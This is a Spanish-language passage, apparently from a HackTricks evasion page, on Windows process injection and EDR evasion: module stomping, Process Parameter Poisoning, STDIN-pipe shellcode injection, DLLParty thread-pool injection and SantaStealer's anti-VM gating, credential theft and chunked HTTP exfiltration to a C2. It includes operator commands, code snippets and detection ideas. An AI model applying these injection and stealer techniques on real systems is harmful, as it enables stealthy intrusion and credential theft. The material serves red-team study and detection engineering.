- Crea un thread auxiliar con `NtTestAlert` como punto de entrada.
- Encola frames `CONTEXT`/APC preparados con `NtQueueApcThread` y ejecútalos con `NtAlertResumeThread`.
- Guarda el estado de la cadena en el heap en vez de hacerlo en el stack auxiliar para evitar agotar el stack predeterminado de 64 KB del thread.
- Usa `NtSignalAndWaitForSingleObject` para señalar el evento de inicio y bloquearse de forma atómica.
- Suspende el thread principal antes de restaurar el TIB/contexto (`NtSuspendThread` → restaurar → `NtResumeThread`) para reducir la ventana de carrera en la que un scanner podría detectar un stack parcialmente restaurado.

Esto sustituye la firma `CreateTimerQueueTimer` + `NtContinue` por una firma de thread auxiliar/APC, manteniendo los mismos objetivos de enmascaramiento RC4 y spoofing del stack.

Ideas adicionales de detección
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco antes de sleeps, esperas o dispatch de APC.
- `GetThreadContext`/`SetThreadContext` alrededor de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de escrituras directas en los límites del stack TEB/TIB del thread actual.
- Cadenas `NtQueueApcThread`/`NtAlertResumeThread` que llegan indirectamente a `SystemFunction032`, `VirtualProtect` o helpers de restauración de permisos de sección.
- Uso repetido de firmas de gadgets cortas como `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) como pivotes de dispatch dentro de módulos firmados.


## Module Stomping de precisión

Module stomping ejecuta payloads desde la **sección `.text` de una DLL ya mapeada dentro del proceso objetivo**, en lugar de asignar memoria ejecutable privada evidente o cargar una DLL sacrificial nueva. El objetivo de sobrescritura debe ser una **imagen cargada respaldada por disco** cuyo espacio de código pueda alojar el payload sin corromper rutas de código que el proceso todavía necesita.<sup>[[1]](#references)[[2]](#references)</sup>

### Selección fiable del objetivo

El stomping ingenuo contra módulos comunes como `uxtheme.dll` o `comctl32.dll` es frágil: puede que la DLL no esté cargada en el proceso remoto, y una región de código demasiado pequeña hará que el proceso se bloquee. Un flujo de trabajo más fiable es:

1. Enumera los módulos del proceso objetivo y conserva una **lista de inclusión solo con nombres** de las DLL ya cargadas.
2. Primero crea el payload y registra su **tamaño exacto en bytes**.
3. Analiza las DLL candidatas en disco y compara `Misc_VirtualSize` de la sección PE **`.text`** con el tamaño del payload. Esto importa más que el tamaño del archivo porque refleja el tamaño de la sección ejecutable **cuando se mapea en memoria**.
4. Analiza la **Export Address Table (EAT)** y elige el RVA de una función exportada como offset inicial del stomp.
5. Calcula el **radio de impacto**: si el payload supera el límite de la función seleccionada, sobrescribirá los exports adyacentes ubicados después de ella en memoria.

Helpers de reconocimiento/selección que suelen verse en la práctica:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notas operativas
- Prefiere DLLs **ya cargadas** en el proceso remoto para evitar la telemetría de `LoadLibrary` y las cargas de imágenes inesperadas.
- Prefiere exports que la aplicación objetivo ejecute rara vez; de lo contrario, las rutas de código normales podrían alcanzar los bytes modificados antes o después de crear el hilo.
- Los implants grandes suelen requerir cambiar la inserción del shellcode de un literal de cadena a un **inicializador de matriz de bytes/entre llaves** para que el búfer completo quede representado correctamente en el código fuente del injector.

Ideas de detección
- Escrituras remotas en páginas ejecutables respaldadas por imágenes (`MEM_IMAGE`, `PAGE_EXECUTE*`), en lugar de las asignaciones privadas RWX/RX más comunes.
- Puntos de entrada de exports cuyos bytes en memoria ya no coinciden con el archivo de respaldo en disco.
- Hilos remotos o cambios de contexto que comienzan la ejecución dentro de un export de una DLL legítima cuyos primeros bytes se modificaron recientemente.
- Secuencias sospechosas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL, seguidas de la creación de un hilo.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) es una técnica de **inyección de procesos / evasión de EDR** que evita la ruta clásica de escritura remota (`VirtualAllocEx` + `WriteProcessMemory`). En lugar de copiar bytes a un proceso objetivo que ya está en ejecución, abusa del hecho de que Windows **copia parámetros de inicio seleccionados de `CreateProcessW` al proceso hijo** y los almacena en `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers envenenables copiados por `CreateProcessW`

Los carriers útiles son:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restricciones prácticas de los carriers:

- `lpCommandLine` debe apuntar a **memoria escribible** para `CreateProcessW` y está limitado a **32,767 caracteres Unicode**, incluido el terminador nulo.
- `lpEnvironment` debe ser un bloque de entorno Unicode compuesto por cadenas `NAME=VALUE\0` consecutivas, terminado por un `\0` adicional.
- `lpReserved` está oficialmente reservado, por lo que la correspondencia con `ShellInfo` debe tratarse como un detalle de implementación, no como un contrato documentado estable.

Esto convierte la creación normal de procesos en la **primitiva de transferencia de payload**. El operador crea el proceso hijo con datos de inicio controlados por el atacante y deja que Windows realice la copia entre procesos.

### Flujo de búsqueda remota sin APIs de escritura remota

Después de crear el proceso hijo, resuelve el búfer copiado con primitivas **de solo lectura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtener `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leer el `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Leer `RTL_USER_PROCESS_PARAMETERS`
5. Usar el puntero seleccionado:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flujo mínimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ejecutar el búfer de parámetros copiado

La región de parámetros copiada suele tener permisos `RW`, no ser ejecutable. Una cadena P3 común es:

1. Crear el proceso normalmente (sin suspenderlo)
2. Hacer que la página de parámetros elegida sea ejecutable con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar el identificador del hilo principal que ya devolvió `PROCESS_INFORMATION`
4. Redirigir la ejecución con `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescribir `RIP`)

A diferencia de los flujos de trabajo clásicos de secuestro de hilos, esto **no requiere** `SuspendThread` / `ResumeThread`; el contexto se puede cambiar directamente usando el identificador devuelto para el hilo principal.

Esto evita varias APIs que suelen supervisarse para detectar inyecciones:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- a menudo también `SuspendThread` / `ResumeThread`

### Limitación de bytes nulos y shellcode por etapas

Los tres portadores son **datos de tipo cadena o similares a cadenas**, por lo que una carga útil sin procesar que contenga `0x00` se trunca durante la transferencia. Una solución práctica es usar una **primera etapa sin bytes nulos** que reconstruya las constantes en tiempo de ejecución y luego cargue una segunda etapa arbitraria.

Un patrón sencillo es la síntesis de constantes basada en XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Esto permite que la primera etapa construya cadenas en la pila, argumentos de API, rutas de DLL o un cargador de shellcode de segunda etapa sin incluir bytes nulos en el parámetro transportado.

### Llamadas a API basadas en la pila desde la primera etapa

Cuando la primera etapa debe llamar a API como `LoadLibraryA`, puede:

- insertar la cadena/búfer en la pila del proceso objetivo
- reservar el **espacio shadow de 32 bytes de x64**
- establecer `RCX`, `RDX`, `R8`, `R9` con constantes o punteros relativos a `RSP`
- mantener `RSP` **alineado a 16 bytes** antes de la llamada

Luego se puede copiar una segunda etapa desde la pila a una asignación `PAGE_READWRITE`, cambiar sus permisos a `PAGE_EXECUTE_READ` con `VirtualProtect` y saltar a ella, evitando una asignación RWX directa.

### Ideas de detección

Buenas oportunidades de detección mencionadas por los autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` que convierte en ejecutables las **páginas de parámetros del proceso**
- ese cambio de protección seguido de `SetThreadContext` / `NtSetContextThread`
- lecturas remotas del `PEB` y luego de `RTL_USER_PROCESS_PARAMETERS`
- valores inusualmente largos o con alta entropía en `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creación del proceso

### Notas

- P3 es un **truco de transferencia entre procesos**, no una primitiva de ejecución completa por sí solo: el parámetro copiado aún requiere un cambio de permisos de ejecución y un método de redirección de la ejecución.
- Los autores consideraron `RtlCreateProcessReflection` / Dirty Vanity, pero lo descartaron porque internamente llega a primitivas sospechosas, como `NtWriteVirtualMemory` y `NtCreateThreadEx`.

## Inyección mediante una pipe de STDIN de consola

También se puede usar un proceso hijo de consola interactivo como **primitiva de transferencia de payload**. El inyector redirige la entrada estándar del hijo a una pipe y envía un marcador seguido de shellcode. Después de que el programa de consola lee los datos en su propia memoria privada, el inyector encuentra ese búfer, le otorga permisos de ejecución y redirige un hilo hijo hacia él. Esto evita `VirtualAllocEx` y `WriteProcessMemory`, pero sigue siendo una inyección de procesos, no un bypass de EDR de propósito general.<sup>[[41]](#references)</sup>

A pesar de la descripción de «named-pipe», la implementación de referencia llama a `CreatePipe`, que crea una **pipe anónima**. Windows implementa internamente las pipes anónimas con objetos de pipe con nombres únicos, pero el PoC no selecciona una ruta `\\.\pipe\<name>` ni llama a `CreateNamedPipe`. Crea handles heredables con un descriptor de seguridad predeterminado, coloca el handle de lectura en `STARTUPINFO.hStdInput`, establece `STARTF_USESTDHANDLES` e inicia un proceso hijo nuevo con la herencia de handles habilitada. Por lo tanto, este PoC inicia el ejecutable de consola indicado; no conecta su pipe a un proceso existente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flujo de trabajo de referencia

La implementación usa la siguiente cadena:<sup>[[41]](#references)</sup>

1. Crear pares de pipes anónimas para `STDIN` y `STDOUT` del proceso hijo. Deshabilitar la herencia en los dos handles del lado del proceso padre y cerrar en el padre los duplicados del lado del proceso hijo después de crear el proceso.
2. Iniciar un ejecutable interactivo, como `netsh.exe` o `nslookup.exe`, con `CREATE_NEW_CONSOLE`. El proceso hijo hereda los handles estándar redirigidos.
3. Enviar la matriz binaria completa `rawData` con `WriteFile` a través del handle de `STDIN` del lado del proceso padre. El programa de consola consume los bytes y deja una copia en una de sus regiones privadas confirmadas.
4. Recorrer el espacio de direcciones del proceso hijo con `VirtualQueryEx`, leer las regiones candidatas `MEM_PRIVATE` con `ReadProcessMemory` y buscar el marcador al principio de `rawData`.
5. Cambiar los permisos del búfer encontrado a `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Identificar el hilo principal, suspenderlo, establecer `RIP` en `found_address + 0x19` con `NtSetContextThread` y reanudarlo.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

La implementación proporcionada es específica para x64: modifica `CONTEXT.Rip` y su payload integrado es shellcode x64. `rawData` comienza con un marcador de 25 bytes, por lo que los bytes ejecutables empiezan en el desplazamiento hexadecimal `0x19`. Al reemplazar el payload, conserva esa disposición o actualiza conjuntamente el marcador, el vector de búsqueda, el tamaño del array y el desplazamiento de ejecución. Los comentarios del código también indican que `0x0A`, `0x0D` y `0x1A` son caracteres no válidos. Este flujo de trabajo no modifica el token ni los privilegios del proceso hijo.<sup>[[41]](#references)</sup>

Para ver pequeños helpers nativos y patrones de compilación de payloads, consulta [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Inyección de DLL mediante callback de thread-pool sin shellcode (DLLParty)

DLLParty adapta la inyección de thread-pool al estilo PoolParty para hacer que un worker existente del proceso objetivo llame a `LoadLibraryA`, en lugar de ejecutar un stub de callback inyectado. Su primitiva de despacho es un `TP_DIRECT` encolado en el puerto de finalización de E/S del pool objetivo. Esto no elude los permisos del proceso: el PoC llama a `OpenProcess(PROCESS_ALL_ACCESS)` y necesita memoria legible/escribible en el proceso objetivo, además de handles de worker-factory y del puerto de finalización que se puedan duplicar.<sup>[[46]](#references)[[47]](#references)</sup>

En Windows x64, el worker pasa un puntero a su `TP_CALLBACK_INSTANCE` respaldado por la pila en `RCX`, el primer argumento del callback. `LoadLibraryA` interpreta ese mismo puntero como un `LPCSTR`. En la ruta probada, `TppWorkerThread` crea el puntero en `RSP+0x178`, mientras que su primera escritura normal en ese objeto se realiza en `RSP+0x1d0`. Por lo tanto, una ruta de DLL terminada en nulo que quepa en este prefijo de 0x58 bytes puede ocupar el inicio de la instancia sin que se sobrescriba antes del despacho. Esta observación corresponde a una compilación específica; no es una garantía documentada de la ABI de Windows.<sup>[[46]](#references)[[47]](#references)</sup>

El flujo de trabajo de referencia es:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumera los handles del proceso objetivo con `NtQuerySystemInformation(SystemHandleInformation)` e identifica `TpWorkerFactory` consultando los tipos de objeto. Duplica un handle de worker-factory y consulta `WorkerFactoryBasicInformation`; `StartParameter` proporciona el `TP_POOL` remoto. Omite las fábricas con `TotalWorkerCount == 0`.
2. Lee `TP_POOL.CompletionPort` y recorre la lista privada de workers del pool. En la compilación x64 probada de Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), el inicio de la lista está en `pool+0x60`; cada enlace está en `worker+0x10`, por lo que el slot de la instancia del callback en `worker+0x38` equivale a `link+0x28`. El PoC comprueba la alineación de los punteros, la reciprocidad de los enlaces, la pertenencia al pool, que los IDs de hilo no sean cero, la repetición de nodos y que el inicio de la lista permanezca estable.
3. Escribe la ruta de la DLL en **todos** los slots de worker recuperados, porque cualquier worker podría consumir la finalización encolada. Coloca un `TP_DIRECT` con `Callback = LoadLibraryA` en memoria escribible del proceso objetivo. El PoC usa `last_slot-0x500` en una pila de worker en lugar de `VirtualAllocEx`; ese desplazamiento es experimental y no debe colisionar con datos activos de la pila.
4. Duplica el handle del puerto de finalización del proceso objetivo y llama a `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. La dirección remota de `TP_DIRECT` es la clave de finalización. A continuación, un worker existente invoca `LoadLibraryA` con el puntero sobrescrito de la instancia del callback y carga una DLL a la que el proceso objetivo ya tiene acceso.

El PoC recibe un PID objetivo (`DLLParty.exe <target_pid>`) y usa una ruta de DLL fija en `DLLParty.cpp`; establece una ruta accesible para el proceso objetivo antes de compilar un ejecutable x64. También usa la dirección de `LoadLibraryA` de su propio proceso como callback remoto, por lo que supone que esa dirección es válida en el proceso objetivo. El código no comprueba que la longitud de la ruta quepa en el prefijo de 0x58 bytes ni que el recorrido de workers haya encontrado un slot antes de indexar el último elemento. Vuelve a validar los desplazamientos privados, la disposición de la pila y el espacio escribible para la compilación objetivo. Omitir `CreateRemoteThreadEx`, shellcode y `VirtualAllocEx` no elimina las escrituras entre procesos ni la telemetría de carga de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Técnicas de SantaStealer para la evasión fileless y el robo de credenciales

SantaStealer (también conocido como BluelineStealer) muestra cómo los info-stealers modernos combinan el bypass de AV, las técnicas anti-análisis y el acceso a credenciales en un único flujo de trabajo.<sup>[[24]](#references)</sup>

### Restricción por distribución del teclado y demora en sandbox

- Un indicador de configuración (`anti_cis`) enumera las distribuciones de teclado instaladas mediante `GetKeyboardLayoutList`. Si encuentra una distribución cirílica, la muestra crea un marcador `CIS` vacío y termina antes de ejecutar los stealers, lo que garantiza que nunca se active en las regiones excluidas y deja un artefacto útil para la búsqueda de amenazas.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Lógica `check_antivm` por capas

- La variante A recorre la lista de procesos, calcula un checksum rodante personalizado para cada nombre y lo compara con listas de bloqueo integradas para debuggers/sandboxes; repite el cálculo del checksum con el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- La variante B inspecciona propiedades del sistema (umbral mínimo de procesos y tiempo de actividad reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las Guest Additions de VirtualBox y realiza comprobaciones de tiempo alrededor de pausas para detectar la ejecución paso a paso. Cualquier detección interrumpe la ejecución antes de que se inicien los módulos.

### Helper fileless + carga reflectiva doble con ChaCha20

- La DLL/EXE principal incluye un helper de credenciales de Chromium que se deja en el disco o se mapea manualmente en memoria; el modo fileless resuelve por sí mismo las importaciones y reubicaciones para no escribir artefactos del helper.
- Ese helper almacena una DLL de segunda etapa cifrada dos veces con ChaCha20 (dos claves de 32 bytes y nonces de 12 bytes). Tras ambas pasadas, carga el blob de forma reflectiva (sin `LoadLibrary`) y llama a las exportaciones `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Las rutinas de ChromElevator usan process hollowing reflectivo con direct-syscall para inyectarse en un navegador Chromium activo, heredar claves de AppBound Encryption y descifrar contraseñas, cookies y tarjetas de crédito directamente desde bases de datos SQLite, a pesar de las protecciones de ABE.


### Recopilación modular en memoria y exfiltración HTTP por fragmentos

- `create_memory_based_log` recorre una tabla global de punteros a funciones `memory_generators` y crea un hilo por cada módulo habilitado (Telegram, Discord, Steam, capturas de pantalla, documentos, extensiones del navegador, etc.). Cada hilo escribe los resultados en búferes compartidos e informa el número de archivos tras una espera de unión de ~45 s.
- Al terminar, todo se comprime con la biblioteca `miniz`, enlazada estáticamente, como `%TEMP%\\Log.zip`. Luego, `ThreadPayload1` espera 15 s y transmite el archivo en fragmentos de 10 MB mediante HTTP POST a `http://<C2>:6767/upload`, suplantando un límite `multipart/form-data` de navegador (`----WebKitFormBoundary***`). Cada fragmento incluye `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional y, en el último fragmento, añade `complete: true` para indicar al C2 que terminó la reconstrucción.

## References

- [1] [Técnicas avanzadas de evasión: module stomping de precisión](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pila de llamadas: se acabaron las concesiones para el malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentación](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – ejemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – ejemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC de suplantación de pila de llamadas](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nueva cadena de infección y ofuscación basada en ConfuserEx para DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – ¿Deberías confiar en tu zero trust? Cómo eludir las comprobaciones de postura de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes de ToolShell: exploración de las operaciones de ransomware anteriores de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso de las exportaciones reenviadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario de exportaciones reenviadas de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Orden de búsqueda de bibliotecas de vínculos dinámicos](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Seguridad de procesos y derechos de acceso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Referencia de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Iniciador CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Cómo contrarrestar los EDR con la protección de Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Cómo romper la protección de Windows Defender con la técnica de redirección de carpetas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referencia del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Tras la cortina de Pure: de RAT a builder y a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer llega a la ciudad: un nuevo y ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Descifrado de Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: cómo derrotar el malware de Node.js mediante el seguimiento de API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La bella durmiente: cómo poner Adaptix a dormir con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Envenenamiento de parámetros de proceso](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La bella durmiente II: CFG, CET y suplantación de pila](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscación del sueño con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ocultar tu Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso de Chrome Remote Desktop en operaciones de Red Team: una guía práctica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: convertir el controlador de corrección de Defender en una primitiva de operaciones de kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Código complementario de Function Peekaboo de MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creación de funciones con autoenmascaramiento mediante LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Código fuente de InjectSetConsole de TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Función CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creación de un proceso hijo con entrada y salida redirigidas](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Necromancy de GhostPack: reconstrucción de herramientas C# con WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilación de proyectos C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Prueba de concepto y código fuente de DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abuso de los componentes internos del pool de hilos para la inyección de DLL sin shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Conjunto de datos de referencia EMBER2024 y herramientas thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Uso de EMBER2024 para evaluar implantes de Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Cómo evadir las detecciones basadas en Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Framework de carga .NET basado en XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Enumeración AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Método IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
